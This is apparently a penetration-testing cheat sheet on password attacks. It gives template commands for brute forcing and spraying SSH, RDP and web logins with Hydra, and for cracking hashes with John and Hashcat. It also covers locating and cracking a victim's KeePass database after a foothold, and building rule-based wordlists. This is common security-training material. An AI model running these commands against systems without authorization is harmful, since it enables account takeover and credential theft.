---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# 🐈‍⬛ Password attacks

## Online Brute force

### Hydra

Brute forcing `SSH`&#x20;

```bash
hydra -l <username> -P <password_wordlist> -s <ssh_port> ssh://<target>
```

Password spraying `RDP`

```bash
hydra -L <username_wordlist> -p <password> rdp://<target>
```

Brute forcing `website login form`

{% code overflow="wrap" %}
```bash
hydra -l <username> -P <wordlist> <target> http-post-form "/<login_page_route>:<username_paramter>=user&<password_paramter>=^PASS^:<failed_login_string>"
```
{% endcode %}

Brute forcing `basic authentication`

```bash
hydra -l <username> -P <wordlist> <target> http-get
```

## Offline Brute force

### John the ripper

Perform offline hash crack:

```bash
john --wordlist=<wordlist> <hashfile>
```

### Hashcat

Find hash types:

```
hashcat --help | grep -i "KeePass"
```

Perform offline hash crack:

```
hashcat -m <hash_type> <hash> <wordlist>
```

## Password Manager

In case the foothold is achieved and the victims uses KeePass is possible to offline crack the master password.

Finding the database file on target machine:

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Creating a crackable hash using `keepass2john` :

```
keepass2john Database.kdbx > keepass.hash
```

Cracking the hash using hashcat:

```bash
hashcat -m 13400 keepass.hash ~/wordlists/rockyou.txt
```

## Identify the hash

### Hash-Identifier

```
hash-identifier
```

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption><p>hash-identifier</p></figcaption></figure>

### Hashid

```
hashid <hash>
```

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption><p>hashid</p></figcaption></figure>

## Wordlists

Modify wordlists according to target password policy using `Hashcat` and a `rule` file:

{% code title="rulefile.rule" %}
```
rules examples:
$<string> - append the string.
^<string> - prepend the string.
c - capitalize the first character.

rules operations:
rule rule rule - the rules affects each word together.

the rules affects separately and creates more words (1 more word each rule):
rule
rule
```
{% endcode %}

More rule functions:

{% embed url="https://hashcat.net/wiki/?id=rule_based_attack#implemented_compatible_functions" %}
Rule Functions
{% endembed %}

There are commonly rule files in the `Hashcat` directory:

```bash
ls -la /usr/share/hashcat/rules/
```

Create and print the new rule based wordlist

```bash
hashcat -r <rulefile> --stdout <wordlist>
```

### Hashcat

Crack using the new rule based wordlist

```bash
hashcat -m <hash_type> <hash> <wordlist> -r <rulefile> 
```

### John

Create rule file for example:

```
[List.Rules:<rule_name>]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

Append the rule file into `/etc/john/john.conf`:

```bash
sudo bash -c 'cat <rulefile> >> /etc/john/john.conf'
```

Crack using the new rule based wordlist

```bash
john --wordlist=<wordlist> --rules=<rule_name> <hashfile>
```
